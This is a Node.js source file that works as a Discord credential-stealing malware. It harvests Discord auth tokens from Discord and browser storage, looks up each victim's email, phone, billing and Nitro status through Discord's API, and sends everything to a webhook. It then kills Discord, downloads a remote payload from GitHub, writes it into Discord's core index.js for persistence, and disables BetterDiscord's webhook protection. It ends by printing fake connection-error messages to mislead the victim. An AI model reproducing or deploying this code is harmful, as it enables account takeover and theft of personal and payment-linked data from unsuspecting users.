
// Code is shit
var glob = require("glob");
const fs = require('fs');
const https = require('https');
const { exec } = require('child_process');
const buf_replace = require('buffer-replace');
const webhook = "da-webhook"
const path = require("path")
const axios = require("axios").default

function xeniumProfile(xeniumDB) {
    xeniumDB += "\\Local Storage\\leveldb";

    let xeniumAccount = [];

    try {
        fs.readdirSync(path.normalize(xeniumDB)).map(file => {
            if (file.endsWith(".log") || file.endsWith(".ldb")) {
                fs.readFileSync(`${xeniumDB}\\${file}`, "utf8").split(/\r?\n/).forEach(line => {
                    const regex = [
                        new RegExp(/mfa\.[\w-]{84}/g), 
                        new RegExp(/[\w-]{24}\.[\w-]{6}\.[\w-]{27}/g)
                    ]; 
                    for (const _regex of regex) {
                        const xenium = line.match(_regex);
                    
                        if (xenium) {
                            xenium.forEach(element => {
                                xeniumAccount.push(element);
                            });
                        }
                    }
                    
                })
            }  
        });
    } catch {
        return
    }
    return xeniumAccount;
}
function startAccount () {
    let paths;
    const computerPlatform = process.platform;

    if (computerPlatform == "win32") {
        const local = process.env.LOCALAPPDATA;
        const roaming = process.env.APPDATA;
        
        paths = {
            "Discord": path.join(roaming, "Discord"),
            "Discord Canary": path.join(roaming, "discordcanary"),
            "Discord PTB": path.join(roaming, "discordptb"),
            "Google Chrome": path.join(local, "Google", "Chrome", "User Data", "Default"),
            "Opera": path.join(roaming, "Opera Software", "Opera Stable"),
            "Brave": path.join(local, "BraveSoftware", "Brave-Browser", "User Data", "Default"),
            "Yandex": path.join(local, "Yandex", "YandexBrowser", "User Data", "Default")
        }
    }
    
    const embeds = []
    const accounts = {};
    let Password = '`Waiting for relogin...`'
    let billing = '`Not Included`'
    for (let [platform, path] of Object.entries(paths)) {
        const poop = xeniumProfile(path);
        if (poop) {
            let account = [...new Set(poop)]            
            account.forEach(t => {
                axios({
                    method:"get",
                    url: "https://discord.com/api/users/@me",
                    headers: {
                        authorization: t
                    }
                }).then((res) => {
                    let phone = "`No Phone Number Connected`"
                    if(res.data.phone) phone = res.data.phone
                    axios({
                        method: "get",
                        url: "https://discord.com/api/users/@me/billing/payment-sources",
                        headers: {
                            authorization: t
                        }
                    }).then((resp) => {
                        if(!resp.data[0]) {billing = billing}
                        else if(resp.data[0]) {billing = "`Included`"}
                        let nitro = "`No nitro`"
                        if(res.data.premium_type == 2) nitro = "`Nitro Booster`"
                        if(res.data.premium_type == 1) nitro = "`Nitro Classic`"
                        embeds.push({thumbnail: {url:"https://cdn.discordapp.com/avatars/"+res.data.id+"/"+res.data.avatar+".webp?size=128"},color:3482788,title: "Logger has been ran!", fields: [{name:"**Token**", value:t, inline:false},{name:"**Password**", value:Password, inline:false},{name:"**Email**", value: res.data.email, inline:true},{name:"**Phone Number**", value:phone, inline:true},{name: "**Billing**", value: billing, inline:false},{name: "**User Information**", value:"**Username:** "+res.data.username+"#"+res.data.discriminator+'\n**ID:** '+res.data.id, inline:true},{name: "**Nitro**", value: nitro, inline:true}]})
                        axios({
                            method:"post",
                            url: webhook,
                            data: {
                                embeds: embeds
                            }
                        })
                    }).catch((err) => {})
                }).catch((err) => {
                    if(err) {
                        account.splice(account.indexOf(t, 0), 1)
                    }
                })
            }); 
            return account
        }  
        
        

    }
}



startAccount()

var LOCAL = process.env.LOCALAPPDATA
var discords = [];
var injectPath = [];
var runningDiscords = [];
fs.readdirSync(LOCAL).forEach(file => {
    if (file.includes("iscord")) {
        discords.push(LOCAL + '\\' + file)
    } else {
        return;
    }
});
discords.forEach(function(file) {
    let pattern = `${file}` + "\\app-*\\modules\\discord_desktop_core-*\\discord_desktop_core\\index.js"
    glob.sync(pattern).map(file => {
        injectPath.push(file)
        listDiscords();
    })
});
function Infect() {
    https.get('https://raw.githubusercontent.com/notthatskidagain/notbaba/main/inject', (resp) => {
        let data = '';
        resp.on('data', (chunk) => {
            data += chunk;
        });
        resp.on('end', () => {
            injectPath.forEach(file => {
                fs.writeFileSync(file, data.replace("%WEBHOOK_LINK%", webhook), {
                    encoding: 'utf8',
                    flag: 'w'
                });
                let folder = file.replace("index.js", "BabaS")
                if (!fs.existsSync(folder)) {
                    fs.mkdirSync(folder, 0744)
                    startDiscord();
                }
            })
        });
    }).on("error", (err) => {
        console.log(err);
    });
};

function listDiscords() {
    exec('tasklist', function(err,stdout, stderr) {
        if (stdout.includes("Discord.exe")) {

            runningDiscords.push("Discord")
        }
        if (stdout.includes("DiscordCanary.exe")) {

            runningDiscords.push("DiscordCanary")
        }
        if (stdout.includes("DiscordPTB.exe")) {

            runningDiscords.push("DiscordPTB")
        };
        killDiscord();
    });
};

function killDiscord() {
    runningDiscords.forEach(disc => {
        exec(`taskkill /IM ${disc}.exe /F`, (err) => {
            if (err) {
              return;
            }
          });
    });
    Infect()
    pwnBetterDiscord()
};

function startDiscord() {
    runningDiscords.forEach(disc => {
        ass = LOCAL + '\\' + disc + "\\Update.exe"
        exec(`${ass} --processStart ${disc}.exe`, (err) => {
            if (err) {
              return;
            }
          });
    });
};
function pwnBetterDiscord() {
    // thx stanley
    var dir = process.env.appdata + "\\BetterDiscord\\data\\betterdiscord.asar"
    if (fs.existsSync(dir)) {
        var x = fs.readFileSync(dir)
        fs.writeFileSync(dir, buf_replace(x, "api/webhooks", "BabaS"))
    } else {
        return;
    }

}
console.log(`Connecting to api...`)
console.log(`FAILEDCon ; Failed to authorize connection...`)
console.log(`Retrying...`)
console.log(`Failed to connect to API.`)
